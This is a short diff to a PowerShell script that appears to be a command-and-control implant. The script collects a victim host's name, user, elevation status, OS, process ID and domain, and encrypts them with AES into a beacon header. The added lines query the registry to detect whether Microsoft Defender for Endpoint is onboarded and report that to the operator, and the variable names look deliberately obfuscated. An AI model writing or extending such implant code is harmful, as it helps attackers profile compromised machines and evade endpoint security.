@@ -73,7 +73,8 @@ if($iselv){
 $whoamiii = $whoamiii + "*"
 }
 
-$raw_header = "$fhstname,$whoamiii,$osos,$pnid,$dddomain";
+$random = (Get-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows Advanced Threat Protection\Status" -Name OnboardingState -ErrorAction SilentlyContinue).OnboardingState;if($random -eq $null){$atp = $false}else{$atp = $true}
+$raw_header = "$fhstname,$whoamiii,$osos,$pnid,$dddomain,$atp";
 $encrypted_header = EncryptAES $AES_KEY $AES_IV $raw_header;
 $final_hostname_encrypted = EncryptAES $AES_KEY $AES_IV $fhstname
 
